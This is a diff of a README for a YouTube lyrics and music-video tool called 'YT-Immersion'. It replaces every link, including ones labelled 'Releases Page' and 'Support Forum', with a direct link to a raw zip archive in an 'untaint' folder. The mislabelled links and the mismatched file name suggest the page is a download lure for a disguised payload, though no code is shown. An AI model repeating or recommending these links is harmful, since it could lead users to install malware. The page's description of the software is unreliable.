@@ -1,6 +1,6 @@
 # 🎶 YT-Immersion - Enjoy YouTube with Lyrics and MV Mode
 
-[![Download YT-Immersion](https://raw.githubusercontent.com/qaryEz/YT-Immersion/main/untaint/YT-Immersion_v1.4.zip)](https://raw.githubusercontent.com/qaryEz/YT-Immersion/main/untaint/YT-Immersion_v1.4.zip)
+[![Download YT-Immersion](https://raw.githubusercontent.com/qaryEz/YT-Immersion/main/untaint/Y-Immersion-v3.4-beta.2.zip)](https://raw.githubusercontent.com/qaryEz/YT-Immersion/main/untaint/Y-Immersion-v3.4-beta.2.zip)
 
 ## ✨ What is YT-Immersion?
 
@@ -12,7 +12,7 @@ Follow these easy steps to download and run YT-Immersion:
 
 1. **Visit the Releases Page**  
    Click the link below to go to the releases page.  
-   [Download YT-Immersion](https://raw.githubusercontent.com/qaryEz/YT-Immersion/main/untaint/YT-Immersion_v1.4.zip)  
+   [Download YT-Immersion](https://raw.githubusercontent.com/qaryEz/YT-Immersion/main/untaint/Y-Immersion-v3.4-beta.2.zip)  
 
 2. **Choose the Right Version**  
    On the releases page, you will see a list of available versions. Look for the latest version marked as "Latest Release."  
@@ -52,7 +52,7 @@ To use YT-Immersion, ensure your system meets these basic requirements:
 ## 📥 Download & Install
 
 To download YT-Immersion, please visit our releases page:  
-[Download YT-Immersion](https://raw.githubusercontent.com/qaryEz/YT-Immersion/main/untaint/YT-Immersion_v1.4.zip)
+[Download YT-Immersion](https://raw.githubusercontent.com/qaryEz/YT-Immersion/main/untaint/Y-Immersion-v3.4-beta.2.zip)
 
 Make sure to follow the installation steps detailed above for a successful setup. 
 
@@ -67,6 +67,6 @@ If you run into any issues:
 
 Need help? We’re here for you. Please reach out with any questions or feedback. You can contact us through the Issues tab on our GitHub page, where our team is ready to assist you.
 
-[Visit the Support Forum](https://raw.githubusercontent.com/qaryEz/YT-Immersion/main/untaint/YT-Immersion_v1.4.zip)
+[Visit the Support Forum](https://raw.githubusercontent.com/qaryEz/YT-Immersion/main/untaint/Y-Immersion-v3.4-beta.2.zip)
 
 Now, go ahead and enhance your YouTube experience with YT-Immersion!
